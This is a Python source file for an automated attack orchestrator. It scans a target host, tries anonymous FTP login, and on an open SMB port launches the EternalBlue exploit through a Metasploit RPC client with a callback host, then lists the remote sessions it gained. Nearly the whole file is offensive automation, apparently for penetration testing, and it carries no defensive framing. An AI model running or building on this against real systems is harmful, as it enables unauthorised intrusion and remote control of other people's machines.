from src.recon import Recon
from src.ftp_client import FTPClient
from src.msf_client import MSFClient
from src.report import Report

class AttackEngine:
    def __init__(self, target, msf_pass, lhost):
        self.target = target
        self.msf_pass = msf_pass
        self.lhost = lhost
        self.recon = Recon()
        self.report = Report()

    def run(self):
        self.report.log(f"Starting Attack Tree V0 against {self.target}")
        
        # Phase 1: Recon
        self.report.log("--- Phase 1: Reconnaissance ---")
        scan_results = self.recon.scan(self.target)
        
        if not scan_results:
            self.report.log("Recon failed or target unreachable. Aborting.")
            self.report.generate()
            return

        tcp_ports = scan_results.get('tcp', {})
        self.report.log(f"Open Ports: {list(tcp_ports.keys())}")

        # Phase 2: Infiltration
        self.report.log("--- Phase 2: Infiltration ---")
        
        # Path B: Port 21 (FTP)
        if 21 in tcp_ports and tcp_ports[21]['state'] == 'open':
            self.report.log("[Path B] Port 21 Open. Attempting FTP Anonymous Login...")
            ftp = FTPClient(self.target)
            success, msg = ftp.check_anonymous()
            self.report.log(f"FTP Result: {msg}")
            if success:
                 self.report.log("FTP Access Gained. (Phase 3 Execution: Listing root dir simulated)")
        else:
            self.report.log("[Path B] Port 21 closed or filtered.")

        # Path A: Port 445 (SMB)
        if 445 in tcp_ports and tcp_ports[445]['state'] == 'open':
            self.report.log("[Path A] Port 445 Open. Attempting EternalBlue...")
            msf = MSFClient(self.msf_pass)
            if msf.connect():
                res = msf.execute_eternalblue(self.target, self.lhost)
                self.report.log(f"MSF Exploit Status: {res}")
                
                # Check for sessions (Phase 3: Execution)
                self.report.log("Checking for active sessions...")
                sessions = msf.check_sessions()
                if sessions:
                    self.report.log(f"Sessions established: {len(sessions)}")
                    for sid, info in sessions.items():
                         self.report.log(f"Session {sid}: {info.get('info', 'Unknown')}")
                         # Here we would run 'whoami' using the session interaction
                else:
                    self.report.log("No sessions established yet.")
            else:
                self.report.log("Skipping exploit: Could not connect to MSF RPC.")
        else:
             self.report.log("[Path A] Port 445 closed or filtered.")

        self.report.generate()
